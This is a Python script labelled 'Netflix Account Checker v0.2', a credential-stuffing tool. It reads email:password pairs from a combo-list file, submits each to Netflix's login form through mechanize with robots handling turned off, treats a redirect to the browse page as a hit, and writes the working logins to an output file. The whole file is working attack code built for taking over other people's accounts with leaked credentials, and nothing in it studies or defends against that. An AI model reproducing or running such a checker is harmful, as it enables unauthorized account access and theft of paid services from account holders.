import mechanize
import time


print('[+]---Netflix Account Checker v0.2---[+]')
time.sleep(2)
contex = 0
contno = 0

accPass = []
outfile = open('worksAcc.txt', 'w')


br = mechanize.Browser()
print('br : ', br)
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [('User-agent', 'Firefox')]
try:
    with open("net.txt", "r") as file:
        for line in file:
            br.open('https://www.netflix.com/fr/login')
            
            # print('br before : ', br)
            # print('br after : ', br)

            split_result = line.split(':')
            print('currentline : ', split_result)
            # Check if there are at least two parts (a and b)
            if len(split_result) >= 2:
                # Extract and strip 'a' and 'b'
                a = split_result[0].strip()
                b = split_result[1].split('|')[0].strip()

            # Print the values of 'a' and 'b'
            br.select_form(nr=0)
            print(f'currentline : {a,b}')

            br.form['userLoginId'] = a
            br.form['password'] = b
            print('logging in to.. mail: '+br.form['userLoginId'])
            response = br.submit()
            print('response : ', response.geturl())
            if response.geturl() == 'https://www.netflix.com/browse':
                print('Account Work')
                contex = contex + 1
                br.open('https://www.netflix.com/SignOut?lnkctr=mL')
                accPass.append(a+':'+b)
                time.sleep(2)
            else:
                print('Account does not work')
                contno = contno + 1
                time.sleep(2)
    print('Writing active accounts to txt..')
    for all in accPass:
        print('all : ' + all)
        outfile.write(str(all)+'\n')
except Exception as e:
    print(f'Something bad happened.. Saving progress. {e}.')
    for all in accPass:
        outfile.write(str(all)+'\n')

print('cuentas activas: ' + str(contex))
print('cuentas muertas: ' + str(contno))
